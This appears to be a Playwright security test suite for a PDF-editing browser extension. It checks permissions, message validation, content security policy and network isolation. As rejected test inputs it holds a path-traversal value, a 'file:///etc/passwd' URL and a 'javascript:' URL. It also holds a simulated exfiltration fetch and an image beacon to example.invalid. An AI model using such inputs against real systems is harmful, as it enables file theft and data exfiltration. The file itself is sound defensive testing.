import { chooseFiles, pageRendered } from '../helpers';
import { expect, test } from './fixtures';

test.describe('extension security', () => {
  test('holds only the declared permissions and no host access', async ({ page, extensionUrl }) => {
    await page.goto(extensionUrl('popup.html'));
    const granted = await page.evaluate(() => chrome.permissions.getAll());
    expect([...(granted.permissions ?? [])].sort()).toEqual([
      'activeTab',
      'scripting',
      'sidePanel',
      'storage',
    ]);
    // Optional permissions and sites stay ungranted until the user allows them.
    expect(granted.origins ?? []).toEqual([]);
  });

  test('the service worker validates every message', async ({ page, extensionUrl }) => {
    await page.goto(extensionUrl('popup.html'));
    const responses = await page.evaluate(async () => {
      const send = (message: unknown) => chrome.runtime.sendMessage(message);
      return {
        unknown: await send({ type: 'files/delete-everything' }),
        malformed: await send({ type: 'activity/record', kind: 'opened', pageCount: -1 }),
        oversized: await send({
          type: 'activity/record',
          kind: 'opened',
          fileName: 'x'.repeat(20_000),
        }),
        badHandoff: await send({ type: 'editor/open', handoffId: '../../secrets' }),
        localFile: await send({ type: 'editor/open-url', url: 'file:///etc/passwd' }),
        script: await send({ type: 'editor/open-url', url: 'javascript:alert(1)' }),
        status: await send({ type: 'status/get' }),
      };
    });
    expect(responses.localFile).toEqual({ ok: false, error: 'invalid-message' });
    expect(responses.script).toEqual({ ok: false, error: 'invalid-message' });
    expect(responses.unknown).toEqual({ ok: false, error: 'invalid-message' });
    expect(responses.malformed).toEqual({ ok: false, error: 'invalid-message' });
    expect(responses.oversized).toEqual({ ok: false, error: 'invalid-message' });
    expect(responses.badHandoff).toEqual({ ok: false, error: 'invalid-message' });
    expect(responses.status).toMatchObject({ ok: true, status: { version: expect.any(String) } });
  });

  test('no page reports a content security policy violation', async ({
    page,
    context,
    extensionUrl,
  }) => {
    // Listening from the first script on: violations at startup count too.
    await context.addInitScript(() => {
      const seen: string[] = [];
      Object.assign(window, { folioViolations: seen });
      document.addEventListener('securitypolicyviolation', (event) =>
        seen.push(`${event.effectiveDirective} ${event.blockedURI}`),
      );
    });
    const violations = () =>
      page.evaluate(() => (window as unknown as { folioViolations: string[] }).folioViolations);
    for (const path of ['popup.html', 'sidepanel.html', 'options.html', 'editor.html']) {
      await page.goto(extensionUrl(path));
      await expect(page.locator('#root')).not.toBeEmpty();
      expect(await violations(), path).toEqual([]);
    }
    await chooseFiles(page, () => page.getByRole('button', { name: /Choose PDF/ }).click(), [
      'basic-3-pages.pdf',
    ]);
    await pageRendered(page);
    expect(await violations(), 'editor with a document').toEqual([]);
  });

  test('the content security policy blocks sending data to other servers', async ({
    page,
    extensionUrl,
  }) => {
    await page.goto(extensionUrl('editor.html'));
    await page.evaluate(() => {
      const seen: string[] = [];
      Object.assign(window, { cspViolations: seen });
      document.addEventListener('securitypolicyviolation', (event) =>
        seen.push(event.effectiveDirective),
      );
      void fetch('https://example.invalid/upload', {
        method: 'POST',
        mode: 'no-cors',
        body: 'document bytes',
      }).catch(() => undefined);
      new Image().src = 'https://example.invalid/pixel.png?d=document';
    });
    await expect
      .poll(() =>
        page.evaluate(() =>
          [...(window as unknown as { cspViolations: string[] }).cspViolations].sort(),
        ),
      )
      .toEqual(['connect-src', 'img-src']);
  });

  test('makes no network requests while opening a document', async ({
    page,
    context,
    extensionUrl,
  }) => {
    const external: string[] = [];
    context.on('request', (request) => {
      if (
        !request.url().startsWith('chrome-extension://') &&
        !request.url().startsWith('data:') &&
        !request.url().startsWith('blob:')
      ) {
        external.push(new URL(request.url()).origin);
      }
    });
    await page.goto(extensionUrl('editor.html'));
    const chooser = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: /Choose PDF/ }).click();
    await (await chooser).setFiles(`${import.meta.dirname}/../../fixtures/basic-3-pages.pdf`);
    await pageRendered(page);
    expect(external).toEqual([]);
  });
});
